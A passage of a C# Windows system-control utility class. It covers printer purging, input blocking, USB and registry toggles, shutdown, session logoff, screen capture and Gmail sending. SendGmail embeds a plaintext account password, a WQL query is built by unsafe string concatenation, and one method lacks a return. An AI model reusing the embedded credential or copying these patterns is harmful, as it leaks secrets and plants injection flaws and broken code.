            PrintServer hostingServer = GetPrinterServerPointer(fullPrinterName);
            PrintQueue hostingQueue = GetPrinterQueuePointer(fullPrinterName);



            try
            {
                // Create objects to represent the server, queue, and print job.

                //MessageBox.Show(hostingQueue.NumberOfJobs.ToString());
                hostingQueue.Purge();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }

        public static string GetIPByComputerName(string s_computername)
        {
            string s_ip = "";
            try
            {
                Dns.GetHostAddresses(s_computername).ToList().ForEach(a => s_ip = a.ToString());
            }
            catch
            {
                s_ip = null;
            }

            return s_ip;
        }

        /// Return Type: BOOL->int
        ///fBlockIt: BOOL->int
        //[System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
        //[return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
        //public static extern bool BlockInput([MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        //public static void BlockInput(int n_span)
        //{
        //    try
        //    {
        //        BlockInput(true);
        //        Thread.Sleep(n_span);
        //    }
        //    finally
        //    {
        //        BlockInput(false);
        //    }
        //}

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool BlockInput(bool fBlockIt);

        public static Exception ToggleDesktop()
        {
            try
            {
                // Create an instance of the shell class
                Shell32.Shell objShel = new Shell32.Shell();

                // Show the desktop
                ((Shell32.IShellDispatch4)objShel).ToggleDesktop();
            }
            catch (Exception ex)
            {
                return ex;
            }

            return null;
        }

        public static Exception SendGmail(string s_from, string[] s_toEmails, string s_subject, string s_body)
        {
            try
            {
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(s_from);

                    foreach (string s_toEmail in s_toEmails)
                    {
                        mail.To.Add(s_toEmail);
                    }

                    mail.Subject = s_subject;
                    mail.Body = s_body;
                    mail.IsBodyHtml = true;
                    //mail.Attachments.Add(new Attachment("C:\\file.zip"));

                    using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                    {
                        smtp.Credentials = new NetworkCredential("skeynetmail@gmail.com", "Hallokh++120210");
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                }
            }
            catch (Exception ex)
            {
                return ex;
            }

            return null;
        }

        public static void RenewNetworkInterface()
        {
            Process.Start("ipconfig", "/renew");
        }

        public static Exception SetInterfaceIPv4Metric(string s_NICConnectionName, string s_metric)
        {
            try
            {
                //ProcessStartInfo psi = new ProcessStartInfo("netsh", "interface ip set address \"" + s_NICConnectionName + "\" static " + s_ip + " " + s_subnetMask + " " + s_defaultGateway + " " + s_metric);
                ProcessStartInfo psi = new ProcessStartInfo("netsh", "interface ipv4 set interface \"" + s_NICConnectionName + "\" metric=" + s_metric);
                Process p = new Process();
                p.StartInfo = psi;
                p.Start();
            }
            catch (Exception ex)
            {
                return ex;
            }
            return null;
        }

        public static List<string> GetAllNetworkInterfacesName2()
        {
            List<string> NICInfo = new List<string>();

            try
            {
                ManagementScope oMs = new ManagementScope();
                ObjectQuery oQuery =
                    new ObjectQuery("Select * From Win32_NetworkAdapter");
                ManagementObjectSearcher oSearcher = new ManagementObjectSearcher(oMs, oQuery);
                ManagementObjectCollection oReturnCollection = oSearcher.Get();
                foreach (ManagementObject oReturn in oReturnCollection)
                    if (oReturn.Properties["NetConnectionID"].Value != null)
                        NICInfo.Add(oReturn.Properties["NetConnectionID"].Value.ToString());
            }catch(Exception ex)
            {
                throw ex;
            }
            return NICInfo;
        }

        public static List<string> GetAllNetworkInterfacesName()
        {
            List<string> NICInfo = new List<string>();
            string s = string.Empty;
            //foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            //{

            //    sNICInfo.Add("ip:{0}, subnet:{1}, type:{2}, mac:{3}, status:{4}", nic.GetIPProperties().UnicastAddresses);
            //}

            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                s = string.Empty;
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    //s += ni.Name;
                    //foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    //{
                    //    if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    //    {
                    //        s += "IP: " + ip.Address.ToString() + ", ";
                    //    }
                    //}
                    NICInfo.Add(ni.Name);
                }
            }

            //NICInfo.Add("ip:{0}, subnet:{1}, type:{2}, mac:{3}, status:{4}", nic.GetIPProperties().UnicastAddresses);

            return NICInfo;
        }

        public static List<string> GetAllNetworkInterfacesInfo()
        {
            List<string> NICInfo = new List<string>();
            string s = string.Empty;
            //foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            //{

            //    sNICInfo.Add("ip:{0}, subnet:{1}, type:{2}, mac:{3}, status:{4}", nic.GetIPProperties().UnicastAddresses);
            //}

            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                s = string.Empty;
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    s += ni.Name;
                    foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            s += "IP: " + ip.Address.ToString() + ", ";
                        }
                    }
                    NICInfo.Add(s);
                }
            }

            //NICInfo.Add("ip:{0}, subnet:{1}, type:{2}, mac:{3}, status:{4}", nic.GetIPProperties().UnicastAddresses);

            return NICInfo;
        }

        public static List<string> GetAllNetworkWlanNames()
        {
            WlanClient client = new WlanClient();
            foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)
            {
                // Lists all available networks
                Wlan.WlanAvailableNetwork[] networks = wlanIface.GetAvailableNetworkList(0);
                foreach (Wlan.WlanAvailableNetwork network in networks)
                {
                    Console.WriteLine("Found network with SSID {0}.", GetStringForSSID(network.dot11Ssid));
                }
            }
        }


        //// The GetWindowThreadProcessId function retrieves the identifier of the thread
        //// that created the specified window and, optionally, the identifier of the
        //// process that created the window.
        //[System.Runtime.InteropServices.DllImport("user32.dll")]
        //private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        // Returns the name of the process owning the foreground window.
        public static string GetCurrentForegroundProcessName()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();

                // The foreground window can be NULL in certain circumstances, 
                // such as when a window is losing activation.
                if (hwnd == null)
                    return "Unknown";

                uint pid;
                GetWindowThreadProcessId(hwnd, out pid);

                foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcesses())
                {
                    if (p.Id == pid)
                        return p.ProcessName;
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
            return "Unknown";
        }

        public static Exception SwitchToAProcess(string s_processName)
        {
            int n_howManyTABs = 1;
            int n_toNext = 1;
            string s_TABs = "%{TAB";
            bool b_found = false;


            try
            {
                foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcesses())
                {
                    if (p.ProcessName.ToLower().Contains(s_processName.ToLower()))
                    {
                        b_found = true;
                        break;
                    }

                    n_howManyTABs++;
                }

                if (b_found)
                {
                    while (true)
                    {
                        string s = GetCurrentForegroundProcessName().ToLower();
                        if (s != s_processName)
                        {
                            SendKeys.SendWait(s_TABs + " " + n_toNext + "}");
                            Thread.Sleep(2000);
                        }
                        else
                        {
                            break;
                        }
                        n_toNext++;
                    }
                }

            }
            catch (Exception ex)
            {
                return ex;
            }

            return null;
        }



        [DllImport("user32.dll", SetLastError = true)]
        static extern bool BringWindowToTop(IntPtr hWnd);
        [DllImport("user32.dll")]
        extern static bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);
        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        public static void SetForceForegroundWindow(string s_proccessName)
        {
            IntPtr targetHandle = IntPtr.Zero;
            uint nullProcessId = 0;
            uint targetThreadId = GetWindowThreadProcessId(targetHandle, out nullProcessId);
            uint currentActiveThreadId = GetWindowThreadProcessId(GetForegroundWindow(), out nullProcessId);

            string processName = s_proccessName;
            string processFilePath = s_proccessName + ".exe";
            //get the process
            Process bProcess = Process.GetProcessesByName(processName).FirstOrDefault();
            //check if the process is nothing or not.
            if (bProcess != null)
            {
                targetHandle = bProcess.MainWindowHandle;


                SetForegroundWindow(targetHandle);
                if (targetThreadId == currentActiveThreadId)
                {

                    BringWindowToTop(targetHandle);
                }
                else
                {

                    AttachThreadInput(targetThreadId, currentActiveThreadId, true);
                    try
                    {

                        BringWindowToTop(targetHandle);
                    }
                    finally
                    {

                        AttachThreadInput(targetThreadId, currentActiveThreadId, false);
                    }
                }
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEMTIME
        {
            public short wYear;
            public short wMonth;
            public short wDayOfWeek;
            public short wDay;
            public short wHour;
            public short wMinute;
            public short wSecond;
            public short wMilliseconds;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetSystemTime(ref SYSTEMTIME st);

        public static void SetSystemTime(DateTime time)
        {
            SYSTEMTIME st = new SYSTEMTIME();
            st.wYear = (short)DateTime.Now.Year; // must be short
            st.wMonth = (short)DateTime.Now.Month;
            st.wDay = (short)DateTime.Now.Day;
            st.wHour = (short)time.Hour;
            st.wMinute = (short)time.Minute;
            st.wSecond = (short)time.Second;

            // invoke the SetSystemTime method now
            SetSystemTime(ref st);
        }
        public static void SetSystemDate(DateTime date)
        {
            SYSTEMTIME st = new SYSTEMTIME();
            st.wYear = (short)date.Year; // must be short
            st.wMonth = (short)date.Month;
            st.wDay = (short)date.Day;
            st.wHour = (short)DateTime.Now.Hour;
            st.wMinute = (short)DateTime.Now.Minute;
            st.wSecond = (short)DateTime.Now.Second;

            // invoke the SetSystemTime method now
            SetSystemTime(ref st);
        }


        public static string USB_GetStatus()
        {
            string sResult = string.Empty;

            RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\UsbStor", true);
            if (key != null)
            {
                sResult = key.GetValue("Start").ToString();
            }
            key.Close();

            return sResult == "3" ? "enabled" : "disabled";
        }
        public static void USB_enableAllStorageDevices()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\UsbStor", true);
            if (key != null)
            {
                key.SetValue("Start", 3, RegistryValueKind.DWord);
            }
            key.Close();
        }
        public static void USB_disableAllStorageDevices()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\UsbStor", true);
            if (key != null)
            {
                key.SetValue("Start", 4, RegistryValueKind.DWord);
            }
            key.Close();
        }
        public static string USB_GetWriteProtectStatus()
        {
            string sResult = string.Empty;

            RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", true);
            if (key != null)
            {
                sResult = key.GetValue("WriteProtect").ToString();
            }
            key.Close();

            return sResult == "1" ? "enabled" : "disabled";
        }
        public static void USB_disableWriteProtect()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", true);
            if (key != null)
            {
                key.SetValue("WriteProtect", 0, RegistryValueKind.DWord);
            }
            key.Close();
        }
        public static void USB_enableWriteProtect()
        {
            RegistryKey key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", true);
            if (key == null)
            {
                Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", RegistryKeyPermissionCheck.ReadWriteSubTree);
                key = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", true);
                key.SetValue("WriteProtect", 1, RegistryValueKind.DWord);
            }
            else if (key.GetValue("WriteProtect") != (object)(1))
            {
                key.SetValue("WriteProtect", 1, RegistryValueKind.DWord);
            }
        }

        public enum PowerOperations
        {
            TurnOff = 0,
            TurnOffForced,
            Reboot,
            RebootForced,
            LogOff,
            Lock
        }
        public static void ComputerShutdown(PowerOperations powerOperation)
        {
            ManagementBaseObject mboShutdown = null;
            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
            mcWin32.Get();

            // You can't shutdown without security privileges
            mcWin32.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject mboShutdownParams =
                     mcWin32.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            string sFlag = string.Empty;
            switch (powerOperation)
            {
                case PowerOperations.TurnOffForced:
                    sFlag = "5";
                    break;
                case PowerOperations.TurnOff:
                    sFlag = "1";
                    break;
                case PowerOperations.RebootForced:
                    sFlag = "6";
                    break;
            }
            mboShutdownParams["Flags"] = sFlag;
            mboShutdownParams["Reserved"] = "0";
            foreach (ManagementObject manObj in mcWin32.GetInstances())
            {
                mboShutdown = manObj.InvokeMethod("Win32Shutdown",
                                               mboShutdownParams, null);
            }
        }
        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        public static bool LogOffCurrentUser()
        {
            return ExitWindowsEx(0, 0);
        }

        static public class MotherboardInfo
        {
            private static ManagementObjectSearcher baseboardSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BaseBoard");
            private static ManagementObjectSearcher motherboardSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_MotherboardDevice");

            static public string Availability
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in motherboardSearcher.Get())
                        {
                            return GetAvailability(int.Parse(queryObj["Availability"].ToString()));
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public bool HostingBoard
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            if (queryObj["HostingBoard"].ToString() == "True")
                                return true;
                            else
                                return false;
                        }
                        return false;
                    }
                    catch
                    {
                        return false;
                    }
                }
            }

            static public string InstallDate
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return ConvertToDateTime(queryObj["InstallDate"].ToString());
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string Manufacturer
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return queryObj["Manufacturer"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string Model
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return queryObj["Model"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string PartNumber
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return queryObj["PartNumber"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string PNPDeviceID
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in motherboardSearcher.Get())
                        {
                            return queryObj["PNPDeviceID"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string PrimaryBusType
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in motherboardSearcher.Get())
                        {
                            return queryObj["PrimaryBusType"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string Product
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return queryObj["Product"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public bool Removable
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            if (queryObj["Removable"].ToString() == "True")
                                return true;
                            else
                                return false;
                        }
                        return false;
                    }
                    catch
                    {
                        return false;
                    }
                }
            }

            static public bool Replaceable
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            if (queryObj["Replaceable"].ToString() == "True")
                                return true;
                            else
                                return false;
                        }
                        return false;
                    }
                    catch
                    {
                        return false;
                    }
                }
            }

            static public string RevisionNumber
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in motherboardSearcher.Get())
                        {
                            return queryObj["RevisionNumber"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string SecondaryBusType
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in motherboardSearcher.Get())
                        {
                            return queryObj["SecondaryBusType"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string SerialNumber
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return queryObj["SerialNumber"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string Status
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject querObj in baseboardSearcher.Get())
                        {
                            return querObj["Status"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string SystemName
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in motherboardSearcher.Get())
                        {
                            return queryObj["SystemName"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            static public string Version
            {
                get
                {
                    try
                    {
                        foreach (ManagementObject queryObj in baseboardSearcher.Get())
                        {
                            return queryObj["Version"].ToString();
                        }
                        return "";
                    }
                    catch
                    {
                        return "";
                    }
                }
            }

            private static string GetAvailability(int availability)
            {
                switch (availability)
                {
                    case 1: return "Other";
                    case 2: return "Unknown";
                    case 3: return "Running or Full Power";
                    case 4: return "Warning";
                    case 5: return "In Test";
                    case 6: return "Not Applicable";
                    case 7: return "Power Off";
                    case 8: return "Off Line";
                    case 9: return "Off Duty";
                    case 10: return "Degraded";
                    case 11: return "Not Installed";
                    case 12: return "Install Error";
                    case 13: return "Power Save - Unknown";
                    case 14: return "Power Save - Low Power Mode";
                    case 15: return "Power Save - Standby";
                    case 16: return "Power Cycle";
                    case 17: return "Power Save - Warning";
                    default: return "Unknown";
                }
            }

            private static string ConvertToDateTime(string unconvertedTime)
            {
                string convertedTime = "";
                int year = int.Parse(unconvertedTime.Substring(0, 4));
                int month = int.Parse(unconvertedTime.Substring(4, 2));
                int date = int.Parse(unconvertedTime.Substring(6, 2));
                int hours = int.Parse(unconvertedTime.Substring(8, 2));
                int minutes = int.Parse(unconvertedTime.Substring(10, 2));
                int seconds = int.Parse(unconvertedTime.Substring(12, 2));
                string meridian = "AM";
                if (hours > 12)
                {
                    hours -= 12;
                    meridian = "PM";
                }
                convertedTime = date.ToString() + "/" + month.ToString() + "/" + year.ToString() + " " +
                hours.ToString() + ":" + minutes.ToString() + ":" + seconds.ToString() + " " + meridian;
                return convertedTime;
            }
        }


        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendStringA(string lpstrCommand, string lpstrReturnString,
                                    int uReturnLength, int hwndCallback);
        public static void CDTrayOpen(string driveLetter)
        {
            string returnString = string.Empty;
            //int ret = mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
            mciSendStringA("open " + driveLetter + ": type CDaudio alias drive" + driveLetter,
                 returnString, 0, 0);
            mciSendStringA("set drive" + driveLetter + " door open", returnString, 0, 0);
        }
        public static void CDTrayClose(string driveLetter)
        {
            string returnString = string.Empty;
            //int ret = mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
            mciSendStringA("open " + driveLetter + ": type CDaudio alias drive" + driveLetter,
                 returnString, 0, 0);
            mciSendStringA("set drive" + driveLetter + " door closed", returnString, 0, 0);
        }

        public static string GetApplicationVersion(string appName)
        {
            string ver = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Product WHERE name = \'" + appName +"\'");
            foreach (ManagementObject obj in searcher.Get())
            {
                ver += obj["Version"] + "\r\n";
            }

            return ver;
        }

       
        public static List<string> GetInstalledApplications()
        { 
            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (Microsoft.Win32.RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
            {
                List<string> apps = new List<string>();

                foreach (string subkey_name in key.GetSubKeyNames())
                {
                    using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                    {
                        string s = (string)subkey.GetValue("DisplayName");
                        if(s != null)
                            apps.Add(s);
                    }
                }

                return apps;
            }
            
        }

        public static List<string> GetLocalComputerUserNames()
        {
            List<string> userNames = new List<string>();

            ManagementScope ms = new ManagementScope("\\\\.\\root\\cimv2");
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_ComputerSystem");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(ms, query);
            foreach (ManagementObject mo in searcher.Get())
            {
                //Console.WriteLine(mo["UserName"].ToString());
                string sUserName = mo["UserName"].ToString();
                if (!string.IsNullOrEmpty(sUserName))
                {
                    userNames.Add(sUserName.Remove(0, sUserName.LastIndexOf("\\") + 1));
                }                
            }

            return userNames;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct WTS_SESSION_INFO
        {
            public Int32 SessionID;
            [MarshalAs(UnmanagedType.LPStr)]
            public String pWinStationName;
            public WTS_CONNECTSTATE_CLASS State;
        }

        internal enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,
            WTSConnected,
            WTSConnectQuery,
            WTSShadow,
            WTSDisconnected,
            WTSIdle,
            WTSListen,
            WTSReset,
            WTSDown,
            WTSInit
        }

        internal enum WTS_INFO_CLASS
        {
            WTSInitialProgram,
            WTSApplicationName,
            WTSWorkingDirectory,
            WTSOEMId,
            WTSSessionId,
            WTSUserName,
            WTSWinStationName,
            WTSDomainName,
            WTSConnectState,
            WTSClientBuildNumber,
            WTSClientName,
            WTSClientDirectory,
            WTSClientProductId,
            WTSClientHardwareId,
            WTSClientAddress,
            WTSClientDisplay,
            WTSClientProtocolType,
            WTSIdleTime,
            WTSLogonTime,
            WTSIncomingBytes,
            WTSOutgoingBytes,
            WTSIncomingFrames,
            WTSOutgoingFrames,
            WTSClientInfo,
            WTSSessionInfo
        }
        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSLogoffSession(IntPtr hServer, int SessionId, bool bWait);

        [DllImport("Wtsapi32.dll")]
        static extern bool WTSQuerySessionInformation(
            System.IntPtr hServer, int sessionId, WTS_INFO_CLASS wtsInfoClass, out System.IntPtr ppBuffer, out uint pBytesReturned);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern IntPtr WTSOpenServer([MarshalAs(UnmanagedType.LPStr)] String pServerName);

        [DllImport("wtsapi32.dll")]
        static extern void WTSCloseServer(IntPtr hServer);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern Int32 WTSEnumerateSessions(IntPtr hServer, [MarshalAs(UnmanagedType.U4)] Int32 Reserved, [MarshalAs(UnmanagedType.U4)] Int32 Version, ref IntPtr ppSessionInfo, [MarshalAs(UnmanagedType.U4)] ref Int32 pCount);

        [DllImport("wtsapi32.dll")]
        static extern void WTSFreeMemory(IntPtr pMemory);

        private static List<int> GetSessionIDs(IntPtr server)
        {
            List<int> sessionIds = new List<int>();
            IntPtr buffer = IntPtr.Zero;
            int count = 0;
            int retval = WTSEnumerateSessions(server, 0, 1, ref buffer, ref count);
            int dataSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
            Int64 current = (int)buffer;

            if (retval != 0)
            {
                for (int i = 0; i < count; i++)
                {
                    WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure((IntPtr)current, typeof(WTS_SESSION_INFO));
                    current += dataSize;
                    sessionIds.Add(si.SessionID);
                }
                WTSFreeMemory(buffer);
            }
            return sessionIds;
        }

        public static bool LogOffAUser(string userName)
        {
             IntPtr server = WTSOpenServer(Environment.MachineName);

            userName = userName.Trim().ToUpper();
            List<int> sessions = GetSessionIDs(server);
            Dictionary<string, int> userSessionDictionary = GetUserSessionDictionary(server, sessions);
            if (userSessionDictionary.ContainsKey(userName))
                return WTSLogoffSession(server, userSessionDictionary[userName], true);
            else
                return false;
        }

        private static Dictionary<string, int> GetUserSessionDictionary(IntPtr server, List<int> sessions)
        {
            Dictionary<string, int> userSession = new Dictionary<string, int>();

            foreach (var sessionId in sessions)
            {
                string uName = GetUserName(sessionId, server);
                if (!string.IsNullOrWhiteSpace(uName))
                    userSession.Add(uName, sessionId);
            }
            return userSession;
        }

        private static string GetUserName(int sessionId, IntPtr server)
        {
            IntPtr buffer = IntPtr.Zero;
            uint count = 0;
            string userName = string.Empty;
            try
            {
                WTSQuerySessionInformation(server, sessionId, WTS_INFO_CLASS.WTSUserName, out buffer, out count);
                userName = Marshal.PtrToStringAnsi(buffer).ToUpper().Trim();
            }
            finally
            {
                WTSFreeMemory(buffer);
            }
            return userName;
        }

        public static void LogOffLocalComputerAllUsers()
        {
            List<string> userNames = GetLocalComputerUserNames();
            foreach (string userName in userNames)
            {                
                LogOffAUser(userName);
            }
        }

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSDisconnectSession(IntPtr hServer, int sessionId, bool bWait);
        public static void LockLocalComputerAllUsers()
        {
            IntPtr ppSessionInfo = IntPtr.Zero;
            Int32 count = 0;
            Int32 retval = WTSEnumerateSessions(IntPtr.Zero, 0, 1, ref ppSessionInfo, ref count);
            Int32 dataSize = Marshal.SizeOf(typeof(WTS_SESSION_INFO));
            Int32 currentSession = (int)ppSessionInfo;

            if (retval == 0) return;

            for (int i = 0; i < count; i++)
            {
                WTS_SESSION_INFO si = (WTS_SESSION_INFO)Marshal.PtrToStructure((System.IntPtr)currentSession, typeof(WTS_SESSION_INFO));
                if (si.State == WTS_CONNECTSTATE_CLASS.WTSActive) WTSDisconnectSession(IntPtr.Zero, si.SessionID, false);
                currentSession += dataSize;
            }
            WTSFreeMemory(ppSessionInfo);
        }

        //[DllImport("user32.dll")]
        //private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        //[DllImport("User32.DLL")]
        //private static extern int SetFocus(int hwnd);

        //[DllImport("user32.dll")]
        //private static extern int GetWindowThreadProcessId(IntPtr hWnd, ref Int32 lpdwProcessId);

        //[DllImport("Kernel32.DLL")]
        //private static extern int GetCurrentThreadID(); 

        //void NewSetForegroundWindow(IntPtr hWnd)
        //{
        //    if (GetForegroundWindow() != hWnd)
        //    {
        //        uint dwMyThreadID = GetWindowThreadProcessId(GetForegroundWindow(), null);
        //        uint dwOtherThreadID = GetWindowThreadProcessId(hWnd, null);
        //        if (dwMyThreadID != dwOtherThreadID)
        //        {
        //            AttachThreadInput(dwMyThreadID, dwOtherThreadID, true);
        //            SetForegroundWindow(hWnd);
        //            SetFocus(hWnd);
        //            AttachThreadInput(dwMyThreadID, dwOtherThreadID, false);
        //        }
        //        else
        //            SetForegroundWindow(hWnd);

        //        if (IsIconic(hWnd))
        //            ShowWindow(hWnd, SW_RESTORE);
        //        else
        //            ShowWindow(hWnd, SW_SHOW);
        //    }
        //}


        /// <summary>
        /// Provides functions to capture the entire screen, or a particular window, and save it to a file.
        /// </summary>
        public class ScreenCapture
        {
            /// <summary>
            /// Creates an Image object containing a screen shot of the entire desktop
            /// </summary>
            /// <returns></returns>
            public static Image CaptureScreen()
            {
                return CaptureWindow(User32.GetDesktopWindow());
            }
            /// <summary>
            /// Creates an Image object containing a screen shot of a specific window
            /// </summary>
            /// <param name="handle">The handle to the window. (In windows forms, this is obtained by the Handle property)</param>
            /// <returns></returns>
            public static Image CaptureWindow(IntPtr handle)
            {
                // get te hDC of the target window
                IntPtr hdcSrc = User32.GetWindowDC(handle);
                // get the size
                User32.RECT windowRect = new User32.RECT();
                User32.GetWindowRect(handle, ref windowRect);
                int width = windowRect.right - windowRect.left;
                int height = windowRect.bottom - windowRect.top;
                // create a device context we can copy to
                IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
                // create a bitmap we can copy it to,
                // using GetDeviceCaps to get the width/height
                IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc, width, height);
                // select the bitmap object
                IntPtr hOld = GDI32.SelectObject(hdcDest, hBitmap);
                // bitblt over
                GDI32.BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, GDI32.SRCCOPY);
                // restore selection
                GDI32.SelectObject(hdcDest, hOld);
                // clean up 
                GDI32.DeleteDC(hdcDest);
                User32.ReleaseDC(handle, hdcSrc);
                // get a .NET image object for it
                Image img = Image.FromHbitmap(hBitmap);
                // free up the Bitmap object
                GDI32.DeleteObject(hBitmap);
                return img;
            }
            /// <summary>
            /// Captures a screen shot of a specific window, and saves it to a file
            /// </summary>
            /// <param name="handle"></param>
            /// <param name="filename"></param>
            /// <param name="format"></param>
            public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
            {
                Image img = CaptureWindow(handle);
                img.Save(filename, format);
            }
            /// <summary>
            /// Captures a screen shot of the entire desktop, and saves it to a file
            /// </summary>
            /// <param name="filename"></param>
            /// <param name="format"></param>
            public static void CaptureScreenToFile(string fileName, ImageFormat format)
            {
                Image img = CaptureScreen();
                img.Save(fileName, format);
            }

            public static string CaptureTheScreen()
            {                
                string sFileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, cls_Utility.UniqFileName("shot", "bmp"));
